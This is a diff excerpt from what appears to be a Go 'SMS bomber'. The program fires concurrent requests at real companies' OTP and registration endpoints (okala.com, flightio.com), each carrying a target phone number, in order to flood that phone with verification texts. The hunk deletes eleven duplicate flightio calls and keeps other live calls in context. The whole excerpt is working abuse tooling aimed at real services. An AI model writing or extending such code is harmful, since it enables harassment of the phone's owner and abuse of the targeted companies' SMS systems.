@@ -313,45 +313,6 @@ func main() {
 		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
 			"mobile": phone,
 		}, ch)   // dar khate 764 neveshteh shodeh.
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-
-
-
-
-
-
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
